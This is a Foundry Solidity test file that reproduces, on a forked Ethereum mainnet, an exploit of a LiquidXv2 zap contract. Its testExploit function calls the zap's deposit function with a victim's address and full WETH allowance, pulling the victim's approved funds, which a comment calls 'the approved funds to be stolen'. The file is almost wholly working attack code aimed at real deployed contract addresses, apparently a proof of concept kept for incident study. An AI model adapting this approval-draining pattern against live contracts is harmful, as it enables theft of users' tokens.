// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";

import "./ILiquidXv2Zap.sol";
import "./ILiquidXv2Pair.sol";

WETH9 constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
IERC20 constant LQDX = IERC20(0x872952d3c1Caf944852c5ADDa65633F1Ef218A26);
ILiquidXv2Zap constant zap = ILiquidXv2Zap(
    payable(0x364f17A23AE4350319b7491224d10dF5796190bC)
);
ILiquidXv2Pair constant WETH_LQDX_pair = ILiquidXv2Pair(
    0x1884C3D0ac1A3ACF0698b2a19866cee4cE27c31A
);

contract LqdxTest is Test {
    address victim = address(0x1);

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function setUp() public {
        vm.createSelectFork("mainnet", 19165893);

        deal(victim, 1 ether);
        deal(address(WETH), victim, 10 ether); // the approved funds to be stolen
        deal(address(this), 1 ether);

        print(
            "victim WETH balance (ether) before attack",
            (WETH.balanceOf(victim)),
            18
        );
        vm.prank(victim);
        WETH.approve(address(zap), 10 ether);
        print(
            "victim approved on zap contract (ether)",
            (WETH.allowance(victim, address(zap))),
            18
        );
    }

    function testExploit() public {
        (uint112 lqdx_before, uint112 weth_before, ) = WETH_LQDX_pair
            .getReserves();
        print("before attack, LQDX in the pool", lqdx_before, 18);
        print("before attack, WETH in the pool", weth_before, 18);

        // attack starts here
        ISwapPlusv1.swapBlock[] memory path;
        uint[3] memory amounts = [WETH.allowance(victim, address(zap)), 0, 0];
        zap.deposit(
            victim,
            address(WETH),
            address(WETH),
            LiquidXv2Zap.swapPath({path: path}),
            address(WETH),
            address(LQDX),
            amounts,
            0
        );

        (uint112 lqdx_after, uint112 weth_after, ) = WETH_LQDX_pair
            .getReserves();
        print("after attack, LQDX in the pool", lqdx_after, 18);
        print("after attack, WETH in the pool", weth_after, 18);
        print(
            "victim WETH balance (ether) after attack",
            (WETH.balanceOf(victim)),
            18
        );
    }
}
